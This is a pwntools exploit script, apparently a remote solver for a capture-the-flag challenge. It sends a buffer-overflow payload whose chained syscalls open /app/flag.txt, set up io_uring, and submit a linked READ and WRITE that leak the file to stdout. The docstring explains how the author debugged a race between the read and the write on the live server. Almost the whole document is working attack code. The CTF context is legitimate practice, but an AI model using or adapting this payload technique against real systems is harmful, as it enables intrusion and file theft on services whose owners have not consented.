#!/usr/bin/env python3
"""Remote ORW for elite_ball_knowledge — fixes the local-works/remote-fails bug.

Diagnosis (via leaks against the live server):
  * binary + Dockerfile identical local vs remote; flag = /app/flag.txt content.
  * remote io_uring ring offsets MATCH our hardcodes (leaked & verified).
  * io_uring WRITE works remote; the file READ's completion lands AFTER our
    separate WRITE already ran (read punted to io-wq / async) -> buffer still
    zero when written out. Locally the read is inline, so it worked.

Fix: submit READ and WRITE as ONE linked chain (IOSQE_IO_LINK on the READ) and
wait for BOTH completions in a single io_uring_enter. The kernel then guarantees
the WRITE runs only after the READ has filled the buffer.

Run:  uv run python solve_remote.py [host] [port]
"""
import os
import re
import sys

from pwn import context, remote

context.arch = "amd64"
context.log_level = "info"

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import solve as S

HOST = sys.argv[1] if len(sys.argv) > 1 else "elijah-balls.chal.zip"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32267

IOSQE_IO_LINK = 0x04
M64 = 0xFFFFFFFFFFFFFFFF


def sqe_at(idx, opcode, fd, addr, length, off=0, udata=0, flags=0):
    """Write a 64-byte sqe at SQES[idx] with an optional IOSQE_* flags byte."""
    base = S.SQES + idx * 64
    q0 = (opcode & 0xFF) | ((flags & 0xFF) << 8) | ((fd & 0xFFFFFFFF) << 32)
    c = S.setmem64(base + 0, q0)
    c += S.setmem64(base + S.SQE_OFF, off & M64)
    c += S.setmem64(base + S.SQE_ADDR, addr)
    c += S.setmem64(base + S.SQE_LEN, length & 0xFFFFFFFF)
    c += S.setmem64(base + S.SQE_UDATA, udata)
    return c


def build(off_val=0, length=0x100):
    c = S.writebytes(S.PATH, b"/app/flag.txt\x00")
    c += S.wsyscall(S.SYS_OPENAT2, S.AT_FDCWD, S.PATH, S.HOW, 24)        # -> fd 3
    c += S.setmem64(S.PARAMS + S.P_FLAGS, S.IORING_SETUP_NO_MMAP)
    c += S.setmem64(S.PARAMS + S.P_CQ_USER, S.RINGS)
    c += S.setmem64(S.PARAMS + S.P_SQ_USER, S.SQES)
    c += S.wsyscall(S.SYS_IO_URING_SETUP, 8, S.PARAMS, 0, 0)            # -> ring fd 4

    # sqe[0] = READ flag (linked), sqe[1] = WRITE buffer to stdout
    c += sqe_at(0, S.IORING_OP_READ, 3, S.FILEBUF, length, off_val, 0x1111, IOSQE_IO_LINK)
    c += sqe_at(1, S.IORING_OP_WRITE, 1, S.FILEBUF, length, 0, 0x2222, 0)

    # sq_array[0]=0, sq_array[1]=1  (two u32 at RINGS+SQ_ARRAY_OFF)
    c += S.setmem64(S.RINGS + S.SQ_ARRAY_OFF, (1 << 32) | 0)
    # sq head=0, tail=2
    c += S.setmem64(S.RINGS + 0, (2 << 32) | 0)
    # submit 2, wait for 2 completions -> WRITE only runs after READ completes
    c += S.wsyscall(S.SYS_IO_URING_ENTER, 4, 2, 2, S.IORING_ENTER_GETEVENTS)
    c += S.wsyscall(231, 0)
    return c


def shoot(off_val, label):
    payload = b"A" * S.OFF + build(off_val)
    assert b"\n" not in payload, "payload has newline"
    io = remote(HOST, PORT, timeout=8)
    io.sendline(payload)
    data = io.recvall(timeout=10) or b""
    try:
        io.close()
    except Exception:
        pass
    m = re.search(rb"grey\{[^}]*\}", data)
    print(f"[{label}] {len(data)}B  first={data[:48]!r}  flag={m.group(0).decode() if m else None}")
    return m.group(0).decode() if m else None


def main():
    print(f"=== {HOST}:{PORT} (linked READ->WRITE) ===")
    for off_val, label in [(0, "off=0"), (M64, "off=-1")]:
        f = shoot(off_val, label)
        if f:
            print(f"\n[+] FLAG: {f}")
            return 0
    print("\n[-] still no flag — fall back to leak_read.py to read the READ's res code")
    return 1


if __name__ == "__main__":
    sys.exit(main())
